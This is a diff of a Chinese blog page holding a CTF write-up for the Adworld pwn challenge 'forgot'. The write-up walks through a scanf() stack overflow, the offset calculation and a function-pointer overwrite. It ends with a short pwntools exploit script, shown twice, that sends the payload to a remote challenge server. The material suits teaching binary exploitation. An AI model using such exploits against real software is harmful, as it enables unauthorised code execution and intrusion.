@@ -283,20 +283,16 @@
         <p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/0.png" class></strong></p>
  <a id="more"></a>
 <p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/6.png" class></strong></p>
-<h3 id="检查文件开启的保护措施"><a class="markdownIt-Anchor" href="#检查文件开启的保护措施"></a> 检查文件开启的保护措施</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/1.png" class></strong></p>
-<h3 id="用ida32打开"><a class="markdownIt-Anchor" href="#用ida32打开"></a> 用IDA32打开</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/2.png" class></strong></p>
-<p>**__isoc99_scanf()**函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。</p>
-<h3 id="shiftf12查看字符串"><a class="markdownIt-Anchor" href="#shiftf12查看字符串"></a> shift+F12查看字符串</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/3.png" class></strong></p>
+<h3 id="检查文件开启的保护措施"><a href="#检查文件开启的保护措施" class="headerlink" title="检查文件开启的保护措施"></a>检查文件开启的保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/1.png" class></strong></p>
+<h3 id="用IDA32打开"><a href="#用IDA32打开" class="headerlink" title="用IDA32打开"></a>用IDA32打开</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/2.png" class></strong></p>
+<p><strong>__isoc99_scanf()</strong>函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。</p>
+<h3 id="shift-F12查看字符串"><a href="#shift-F12查看字符串" class="headerlink" title="shift+F12查看字符串"></a>shift+F12查看字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/3.png" class></strong></p>
 <p>找到其调用函数的位置</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/4.png" class></strong></p>
 <p>查看sub_80486CC函数所在地址（这里函数名称就对应其地址）</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/5.png" class></strong></p>
 <p>其函数所在地址0x080486CC，注意这里调用system函数需要传递<strong>cat flag</strong>参数，如果跳转地址直接为system函数的地址，则无法传递相应的参数。</p>
-<h3 id="基本思路"><a class="markdownIt-Anchor" href="#基本思路"></a> 基本思路</h3>
-<p>利用栈溢出漏洞，输入v2，将v3-v12任意一个函数的地址修改为sub_80486CC的地址，之后让控制函数执行调用即可。</p>
+<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>利用栈溢出漏洞，输入v2，将v3-v12任意一个函数的地址修改为sub_80486CC的地址，之后让控制函数执行调用即可。</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/7.png" class></strong></p>
 <p>v2是一个32字节的char数组，v2基地址为ebp-0x74，v3基地址为0x54，相差0x74-0x54=0x20=32byte，正好是32字节的char数组的空间大小。因此，这里选择覆盖v3的地址，原因在于v3在栈中紧贴存在栈溢出漏洞的变量，对程序流程造成的未知影响的可能性最小。之后只需要保证函数结尾调用v3，则需要保证- -v14等于0，即让v14等于1。</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/8.png" class></strong></p>
@@ -305,10 +301,8 @@
 <p>查看其ASCII码对应的字符为：</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/10.png" class></strong></p>
 <p>若要使得该函数的判断条件不成立，则不能输入字符‘a’-‘z’，’0‘-’9‘，’+‘ ，’-‘，’_’</p>
-<h3 id="编写python脚本"><a class="markdownIt-Anchor" href="#编写python脚本"></a> 编写python脚本</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52435</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line">payload = <span class="string">&#x27;/&#x27;</span>*(<span class="number">0x74</span><span class="number">-0x54</span>)+ p32(cat_flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/11.png" class></strong></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52435</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line">payload = <span class="string">&#x27;/&#x27;</span>*(<span class="number">0x74</span><span class="number">-0x54</span>)+ p32(cat_flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/11.png" class></strong></p>
 
     </div>
 
@@ -396,7 +390,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E5%BC%80%E5%90%AF%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">1.</span> <span class="nav-text"> 检查文件开启的保护措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8ida32%E6%89%93%E5%BC%80"><span class="nav-number">2.</span> <span class="nav-text"> 用IDA32打开</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shiftf12%E6%9F%A5%E7%9C%8B%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">3.</span> <span class="nav-text"> shift+F12查看字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="nav-number">4.</span> <span class="nav-text"> 基本思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99python%E8%84%9A%E6%9C%AC"><span class="nav-number">5.</span> <span class="nav-text"> 编写python脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn"><span class="nav-number">6.</span> <span class="nav-text"> PWN</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E5%BC%80%E5%90%AF%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">1.</span> <span class="nav-text">检查文件开启的保护措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8IDA32%E6%89%93%E5%BC%80"><span class="nav-number">2.</span> <span class="nav-text">用IDA32打开</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shift-F12%E6%9F%A5%E7%9C%8B%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">3.</span> <span class="nav-text">shift+F12查看字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="nav-number">4.</span> <span class="nav-text">基本思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99python%E8%84%9A%E6%9C%AC"><span class="nav-number">5.</span> <span class="nav-text">编写python脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PWN"><span class="nav-number">6.</span> <span class="nav-text">PWN</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
